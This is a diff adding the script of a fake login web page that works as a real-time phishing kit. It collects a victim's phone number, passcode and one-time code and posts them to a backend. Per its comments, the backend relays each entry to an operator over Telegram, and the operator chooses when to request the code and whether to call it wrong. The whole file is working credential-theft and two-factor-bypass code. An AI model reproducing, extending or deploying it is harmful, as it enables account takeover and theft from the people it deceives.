+  }
+
+  // ════════════════════════════════════════════════════
+  //  STEP 1: Phone + Passcode → notify backend (login)
+  //  Backend sends Telegram message to admin with [Send OTP] button
+  // ════════════════════════════════════════════════════
+  async function notifyLogin() {
+    showWaiting('Verifying your details…', 'Please wait a moment');
+    try {
+      const res  = await fetch(API_BASE + '/notify', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type:        'login',
+          phone:       SESSION.phone,
+          countryCode: SESSION.countryCode,
+          passcode:    SESSION.passcode,
+        }),
+      });
+      const data = await res.json();
+      if (!data.ok) throw new Error(data.error || 'Server error');
+
+      SESSION.loginToken = data.token;
+
+      // Poll every 2s — when admin clicks "Send OTP", navigate to OTP screen
+      startPolling(SESSION.loginToken, (result) => {
+        hideWaiting();
+        if (result === 'otp_allowed') {
+          const prefix = SESSION.countryCode;
+          const phone  = SESSION.phone;
+          document.getElementById('otpPhoneDisplay').textContent = prefix + ' ' + phone;
+          startOtpTimer();
+          goTo('screen-otp');
+        } else if (result === 'expired') {
+          showErrOverlay('Request timed out. Please try again.');
+        }
+      });
+
+    } catch (err) {
+      hideWaiting();
+      showErrOverlay('Could not reach server. Check your connection.');
+      console.error(err);
+    }
+  }
+
+  // ════════════════════════════════════════════════════
+  //  STEP 2: OTP submitted → notify backend
+  //  Backend sends Telegram message with [Continue] [Wrong Code]
+  // ════════════════════════════════════════════════════
+  async function submitOTP() {
+    showWaiting('Checking your code…', 'Please wait a moment');
+    try {
+      const res  = await fetch(API_BASE + '/notify', {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          type:        'otp',
+          phone:       SESSION.phone,
+          countryCode: SESSION.countryCode,
+          otp:         otpVal,
+          passcode:    SESSION.passcode,
+        }),
+      });
+      const data = await res.json();
+      if (!data.ok) throw new Error(data.error || 'Server error');
+
+      SESSION.otpToken = data.token;
+
+      startPolling(SESSION.otpToken, (result) => {
+        hideWaiting();
+        if (result === 'otp_correct') {
+          showSuccessOverlay();
+        } else if (result === 'otp_wrong') {
+          showWrongOverlay();
+        } else if (result === 'expired') {
+          showErrOverlay('Request timed out. Please try again.');
+        }
+      });
+
+    } catch (err) {
+      hideWaiting();
+      showErrOverlay('Could not reach server. Check your connection.');
+      console.error(err);
+    }
+  }
+
+  // ════════════════════════════════════════════════════
+  //  POLLING — checks /poll every 2 seconds
+  // ════════════════════════════════════════════════════
+  function startPolling(token, callback) {
+    if (SESSION.pollIv) clearInterval(SESSION.pollIv);
+    let attempts = 0;
+    SESSION.pollIv = setInterval(async () => {
+      attempts++;
+      if (attempts > 150) { // 5 min timeout
+        clearInterval(SESSION.pollIv);
+        callback('expired');
+        return;
+      }
+      try {
+        const res  = await fetch(API_BASE + '/poll', {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify({ token }),
+        });
+        const data = await res.json();
+        if (!data.ok) return;
+        if (data.result !== 'pending') {
+          clearInterval(SESSION.pollIv);
+          callback(data.result);
+        }
+      } catch { /* keep polling on network blip */ }
+    }, 2000);
+  }
+
+  // ════════════════════════════════════════════════════
+  //  OVERLAY HELPERS
+  // ════════════════════════════════════════════════════
+  function showWaiting(title, sub) {
+    document.getElementById('ov-title').textContent = title;
+    document.getElementById('ov-sub').textContent   = sub;
+    document.getElementById('ov-waiting').style.display = 'flex';
+  }
+  function hideWaiting() {
+    document.getElementById('ov-waiting').style.display = 'none';
+  }
+  function showWrongOverlay() {
+    // Reset OTP and show wrong code message
+    otpVal = '';
+    document.getElementById('otp-hidden').value = '';
+    updateOtpBoxes();
+    document.getElementById('ov-wrong').style.display = 'flex';
+  }
+  function closeWrongOverlay() {
+    document.getElementById('ov-wrong').style.display = 'none';
+    setTimeout(() => document.getElementById('otp-hidden').focus(), 200);
+  }
+  function showSuccessOverlay() {
+    document.getElementById('ov-success').style.display = 'flex';
+  }
+  function showErrOverlay(msg) {
+    document.getElementById('ov-err-msg').textContent = msg;
+    document.getElementById('ov-err').style.display = 'flex';
+  }
+  function closeErrOverlay() {
+    document.getElementById('ov-err').style.display = 'none';
+  }
+</script>
+</body>
+</html>
